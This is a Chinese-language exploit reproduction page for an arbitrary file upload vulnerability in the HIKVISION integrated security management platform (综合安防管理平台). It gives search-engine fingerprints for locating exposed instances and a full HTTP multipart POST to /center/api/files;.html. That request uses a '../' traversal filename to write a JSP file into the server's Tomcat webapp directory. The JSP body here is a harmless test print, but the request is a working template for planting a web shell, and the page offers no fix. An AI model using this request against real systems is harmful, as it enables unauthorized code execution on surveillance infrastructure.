# HiKVISION 综合安防管理平台 files 任意文件上传漏洞

## 漏洞描述

HiKVISION 综合安防管理平台 files 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件

## 漏洞影响

<a-checkbox checked>HiKVISION 综合安防管理平台</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="HIKVISION-综合安防管理平台" </a-checkbox></br>

<a-checkbox checked>web.title=="综合安防管理平台"  </a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1681661275768-9965dbd4-176f-48bc-b55a-062dbe7c5317.png)

需要开放运行管理中心 (8001端口)

![img](../../../.vuepress/public/img/1686202553411-652899eb-3e94-487a-9e7f-f90e245aeb66.png)

```plain
POST /center/api/files;.html HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%out.print("test3");%>

------WebKitFormBoundary9PggsiM755PLa54a--
```

![img](../../../.vuepress/public/img/1686044472564-03129d33-f072-40d9-8570-0a96bbb6e30f.png)